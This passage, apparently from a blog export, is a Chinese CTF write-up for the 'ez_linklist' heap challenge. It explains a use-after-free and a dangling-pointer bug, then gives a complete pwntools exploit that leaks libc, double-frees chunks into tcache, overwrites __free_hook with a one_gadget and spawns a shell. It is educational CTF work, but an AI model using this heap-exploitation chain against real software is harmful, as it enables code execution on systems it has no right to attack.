chunk2\n\nadd(0x40,'a'*0x8)#idx=11 chunk1\n\n#list[0]:0=>2=>13\n#list[1]:6\n#list[2]:7\n#list[3]:3=>4=>5\n#list[4]:8\n#list[5]:9\n#list[6]:10\n#list[7]:11\n#list[8]:12\n#list[9]:2\n#list[10]:2\n#list[11]:1\n\n#set idx 11 size , to get unsorted bin\npayload = p64(heap_base + 0x2a0) + p64(0x441) + b'aaaaaaaa'(+0x2a0是为了保持原来的数据)\nadd(0x40,payload)#idx=12 0x5631022d58a0 -> content == 0x5631022d52f0\n#now the size of chunk1 is 0x441 , prev_size =0x5631022d52a0(chunk0的content)\n#add后 0x50 [  0]: 0x5631022d52a0 ◂— ...(chunk0的content)导致的free，但实际上没执行free\n#unsorted bin\ndele(11,0)\n\n# unsortedbin\n# all: 0x5631022d5300 —▸ 0x7f1998a0bbe0 (main_arena+96) ◂— 0x5631022d5300\n# 0x5631022d5300:\t0x00005631022d52a0\t0x0000000000000441\n# 0x5631022d5310:\t0x00007f1998a0bbe0\t0x00007f1998a0bbe0\n#修改了size之后，后续9个chunk（含content）和1个content也被包含在chunk1的content中\n#即一直到chun10的content都被包含了，chunk10本体并没有\n\nadd(0x60,'a'*0x8) #idx=11\n#从chunk1 size==0x441的bin中切割出size==0x71的chunk作为content\n\n#unlink to leak\nlink(1,10)\n\n#list[0]:0=>2=>13\n#list[1]:6=>2\n#list[2]:7\n#list[3]:3=>4=>5\n#list[4]:8\n#list[5]:9\n#list[6]:10\n#list[7]:11\n#list[8]:12\n#list[9]:2\n#list[10]:null\n#list[11]:1（0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）\n#list[12]:14\n\np.recvuntil(\"Your choice:\\n\")\np.sendline(str(4))\np.recvuntil(\"Index:\\n\")\np.sendline(str(1))\n\n#leak libc base\n#此时原来chunk2的content在0x3d1大小的chunk的起始位置\n#通过unlink输出content中的unsortbin头\np.recvuntil(\"Offset 1:\")\nlibc_base = u64(p.recv(6).ljust(8,b'\\x00')) - 96 - 0x10 - libc.symbols['__malloc_hook']\nfree_hook = libc_base + libc.symbols['__free_hook']\none_gadget = 0xe6c81\none_gadget_addr = libc_base + one_gadget\n# log.info(\"libc_base : \" + hex(libc_base))\n# log.info(\"free_hook : \" + hex(free_hook))\n# log.info(\"one_gadget_addr : \" + hex(one_gadget_addr))\n# log.info(\"heap_base : \" + hex(heap_base))\np.recvuntil(\"Input offset:\\n\")\np.sendline(str(1))\n\n#fill of tcache\ndele(0,0)\ndele(1,0)\ndele(2,0)\ndele(4,0)\ndele(5,0)\ndele(6,0)\ndele(7,0)\n#11=>10=>9=>8=>7=>6=>0\n\n#use list[3]\nunlink(3,1)\n\n#double free\ndele(3,1)\ndele(1,255)\n#fast bin5=>4=>5\n# 0x20: 0x5631022d5510 —▸ 0x5631022d54a0 ◂— 0x5631022d5510\n# 0x50: 0x5631022d54c0 —▸ 0x5631022d5450 ◂— 0x5631022d54c0\n\n\n#list[0]:2=>13\n#list[1]:null\n#list[2]:null\n#list[3]:3\n#list[4]:null\n#list[5]:null\n#list[6]:null\n#list[7]:null\n#list[8]:null\n#list[9]:2\n#list[10]:2\n#list[11]:1（0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）\n#list[12]:14\n\nfor i in range(7):\n    add(0x40,'a'*0x8)\n\nlink(1,10)\nlink(1,11)\nlink(1,12)\nlink(1,13)\n\n#list[0]:2=>13=>2=>1=>14（1是0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）\n#list[1]:11\n#list[2]:10\n#list[3]:3\n#list[4]:9\n#list[5]:8\n#list[6]:7\n#list[7]:6\n#list[8]:0\n#list[9]:2\n#list[10]:null\n#list[11]:null\n#list[12]:null\n\n#fast bin5=>4=>5\n# 0x20: 0x5631022d5510 —▸ 0x5631022d54a0 ◂— 0x5631022d5510\n# 0x50: 0x5631022d54c0 —▸ 0x5631022d5450 ◂— 0x5631022d54c0\n#通过double free 后的add修改tcache的指针指向\nadd(0x40,p64(free_hook) + b'aaaa')#5\n\n\nlink(10,9)\n\n# tcachebins\n# 0x20 [  3]: 0x5631022d54b0 —▸ 0x5631022d5520 ◂— 0x0\n# 0x50 [  4]: 0x5631022d52b0 —▸ 0x5631022d5460 —▸ 0x5631022d54d0 —▸ 0x7f1998a0de48 (__free_hook) ◂— 0x0\n#连续申请4个来改写__free_hook,tcache不会检查size\nadd(0x40,p64(free_hook) + b'aaaa')#4\nadd(0x40,p64(free_hook) + b'aaaa')#5\nadd(0x40,p64(free_hook) + b'aaaa')#15\n\nadd(0x40,p64(one_gadget_addr) + b'aaaa')#16\n\n#list[0]:2=>13=>2=>1=>14（1是0x71,chunk1还是那个chunk1,overlap了，也被包含在这个content里）\n#list[1]:11\n#list[2]:10\n#list[3]:3\n#list[4]:9\n#list[5]:8\n#list[6]:7\n#list[7]:6\n#list[8]:0\n#list[9]:4\n#list[10]:5=>2\n#list[11]:5\n#list[12]:15\n#list[13]:16\n\n#调用free,执行one_gadget\np.recvuntil(\"Your choice:\\n\")\np.sendline(str(2))\np.recvuntil(\"Index\\n\")\np.sendline(str(0))\np.recvuntil(\"Input offset:\\n\")\np.sendline(str(0))\n\n\np.interactive()\n```\n","slug":"ez_linklist","published":1,"updated":"2023-01-02T15:40:28.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czafw003d5oudda1d65iu","content":"<p>在链表中非常复杂的fast bin double free。</p>\n<span id=\"more\"></span>\n\n<p>64位菜单题，大部分保护都开了</p>\n<p>里面有个链表的数组chunk_list，还有记录每个链表中节点个数的数组chunk_num。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">node</span>    //固定0<span class=\"title\">x18</span>大小</span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">    node* next;    <span class=\"comment\">//指向下一个node</span></span><br><span class=\"line\">    <span class=\"type\">int</span> size;    <span class=\"comment\">//content的chunk的user size,size&lt;=0x70</span></span><br><span class=\"line\">    _Qword* content;    <span class=\"comment\">//content指针，指向malloc(size)</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>大概有4个功能，增加结点(add)、删除结点(delete)、连接(link)、解除连接(unlink)</p>\n<p>add是创建一个node以及其content，在chunk_list中找到一个idx最小的空位，将node放到那里。</p>\n<p>delete有两种模式，如果输入的offset==255,那么则是把这一条链表的node及其content从头到尾进行free，否则是free该链表的第offset个node和content。delete处存在UAF，如果offset!=255，free后的node中仍保存着content指针,并且content内容不会改变。</p>\n<p>link是将两个chunk_list连接在一起，dest_list会链接到src_list的末尾，并且chunk_list[dest]=0，让它指向空。</p>\n<p>unlink是根据offset将一个chunk从chunk_list中取出，第offset个chunk会成为idx最小的空chunk_list的第1个chunk，<strong>但是分出去的chunk的next部分没有清空，仍然指向原来后续的chunk</strong>。除此之外，unlink会<strong>输出</strong>该chunk_list下所有chunk的content，可以用来泄露。</p>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br><span class=\"line\">285</span><br><span class=\"line\">286</span><br><span class=\"line\">287</span><br><span class=\"line\">288</span><br><span class=\"line\">289</span><br><span class=\"line\">290</span><br><span class=\"line\">291</span><br><span class=\"line\">292</span><br><span class=\"line\">293</span><br><span class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br><span class=\"line\">325</span><br><span class=\"line\">326</span><br><span class=\"line\">327</span><br><span class=\"line\">328</span><br><span class=\"line\">329</span><br><span class=\"line\">330</span><br><span class=\"line\">331</span><br><span class=\"line\">332</span><br><span class=\"line\">333</span><br><span class=\"line\">334</span><br><span class=\"line\">335</span><br><span class=\"line\">336</span><br><span class=\"line\">337</span><br><span class=\"line\">338</span><br><span class=\"line\">339</span><br><span class=\"line\">340</span><br><span class=\"line\">341</span><br><span class=\"line\">342</span><br><span class=\"line\">343</span><br><span class=\"line\">344</span><br><span class=\"line\">345</span><br><span class=\"line\">346</span><br><span class=\"line\">347</span><br><span class=\"line\">348</span><br><span class=\"line\">349</span><br><span class=\"line\">350</span><br><span class=\"line\">351</span><br><span class=\"line\">352</span><br><span class=\"line\">353</span><br><span class=\"line\">354</span><br><span class=\"line\">355</span><br><span class=\"line\">356</span><br><span class=\"line\">357</span><br><span class=\"line\">358</span><br><span class=\"line\">359</span><br><span class=\"line\">360</span><br><span class=\"line\">361</span><br><span class=\"line\">362</span><br><span class=\"line\">363</span><br><span class=\"line\">364</span><br><span class=\"line\">365</span><br><span class=\"line\">366</span><br><span class=\"line\">367</span><br><span class=\"line\">368</span><br><span class=\"line\">369</span><br><span class=\"line\">370</span><br><span class=\"line\">371</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context(os = <span class=\"string\">&#x27;linux&#x27;</span>,arch = <span class=\"string\">&#x27;amd64&#x27;</span>,log_level = <span class=\"string\">&#x27;debug&#x27;</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">&quot;./pwn&quot;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&quot;./libc.so.6&quot;</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process(&quot;./pwn&quot;)  </span></span><br><span class=\"line\">p = remote(<span class=\"string\">&quot;tcp.dasc.buuoj.cn&quot;</span>, <span class=\"number\">24502</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">add</span>(<span class=\"params\">size,content</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">1</span>))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Size:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Content:\\n&quot;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">dele</span>(<span class=\"params\">idx,offset</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">2</span>))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Input offset:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(offset))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">link</span>(<span class=\"params\">src,dest</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">3</span>))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;link from:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(src))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;link to:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(dest))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">unlink</span>(<span class=\"params\">idx,offset</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Your choice:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(<span class=\"number\">4</span>))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Index:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(idx))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&quot;Input offset:\\n&quot;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(offset))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">6</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#0,1,2,3,4,5</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;1=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\">link(<span class=\"number\">0</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">link(<span class=\"number\">0</span>,<span class=\"number\">2</span>)</span><br><span class=\"line\">link(<span class=\"number\">3</span>,<span class=\"number\">4</span>)</span><br><span class=\"line\">link(<span class=\"number\">3</span>,<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:1=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\">unlink(<span class=\"number\">0</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#fill tcache and add chunk13</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#chunk6~13,idx == 2,4,5,6,7,8,9,10</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:1=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:6</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:12</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:13</span></span><br><span class=\"line\"></span><br><span class=\"line\">dele(<span class=\"number\">2</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">4</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">5</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">6</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">7</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">8</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">dele(<span class=\"number\">9</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#double free</span></span><br><span class=\"line\"><span class=\"comment\">#fast bin :</span></span><br><span class=\"line\"><span class=\"comment\">#2=&gt;1=&gt;2</span></span><br><span class=\"line\">dele(<span class=\"number\">0</span>,<span class=\"number\">1</span>)</span><br><span class=\"line\">dele(<span class=\"number\">1</span>,<span class=\"number\">255</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:null</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:13</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#clear tcache</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">7</span>):</span><br><span class=\"line\">    add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;a&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#idx=1,2,4,5,6,7,8</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#fast bins to tcache</span></span><br><span class=\"line\"><span class=\"comment\">#tcache:</span></span><br><span class=\"line\"><span class=\"comment\">#2=&gt;1=&gt;2</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># fastbins chunk2=&gt;chunk1=&gt;chunk2</span></span><br><span class=\"line\"><span class=\"comment\"># 0x20: 0x5631022d53c0 —▸ 0x5631022d5350 ◂— 0x5631022d53c0</span></span><br><span class=\"line\"><span class=\"comment\"># 0x50: 0x5631022d5370 —▸ 0x5631022d5300 ◂— 0x5631022d5370</span></span><br><span class=\"line\"><span class=\"comment\">#reset the fd of content2</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;\\x00&#x27;</span>)<span class=\"comment\">#idx=9 chunk2</span></span><br><span class=\"line\"><span class=\"comment\">#after this work, chunk1=&gt;chunk2=&gt;0x0(next=0 in function add())</span></span><br><span class=\"line\"><span class=\"comment\">#but in content, we only write a lowbyte &#x27;\\x00&#x27; in the fd</span></span><br><span class=\"line\"><span class=\"comment\">#so it change from 0x5631022d5300 to 0x5631022d5300  (如果最低位不是\\x00也会变为\\x00)</span></span><br><span class=\"line\"><span class=\"comment\">#when malloc , chunks in fast bins transfer to tcachebins</span></span><br><span class=\"line\"><span class=\"comment\"># tcachebins chunk1=&gt;chunk2</span></span><br><span class=\"line\"><span class=\"comment\"># 0x20 [  3]: 0x5631022d5360 —▸ 0x5631022d53d0 ◂— 0x0(next have clear in add())</span></span><br><span class=\"line\"><span class=\"comment\"># 0x50 [  3]: 0x5631022d5310 —▸ 0x5631022d5380 —▸ 0x5631022d5300 —▸ 0x5631022d52a0 ◂— ...</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:6</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:11</span></span><br><span class=\"line\"><span class=\"comment\">#list[8]:12</span></span><br><span class=\"line\"><span class=\"comment\">#list[9]:2</span></span><br><span class=\"line\"><span class=\"comment\">#list[10]:13</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[9]: 2=&gt;13</span></span><br><span class=\"line\">link(<span class=\"number\">9</span>,<span class=\"number\">10</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#idx=10 chunk1</span></span><br><span class=\"line\">add(<span class=\"number\">0x40</span>,<span class=\"string\">&#x27;b&#x27;</span>*<span class=\"number\">0x8</span>)<span class=\"comment\">#idx=11 chunk2</span></span><br><span class=\"line\"></span><br><span class=\"line\">link(<span class=\"number\">0</span>,<span class=\"number\">9</span>)</span><br><span class=\"line\">link(<span class=\"number\">1</span>,<span class=\"number\">11</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#list[0]:0=&gt;2=&gt;13</span></span><br><span class=\"line\"><span class=\"comment\">#list[1]:6=&gt;2</span></span><br><span class=\"line\"><span class=\"comment\">#list[2]:7</span></span><br><span class=\"line\"><span class=\"comment\">#list[3]:3=&gt;4=&gt;5</span></span><br><span class=\"line\"><span class=\"comment\">#list[4]:8</span></span><br><span class=\"line\"><span class=\"comment\">#list[5]:9</span></span><br><span class=\"line\"><span class=\"comment\">#list[6]:10</span></span><br><span class=\"line\"><span class=\"comment\">#list[7]:11</span></span><br><span class=\"line\"><span 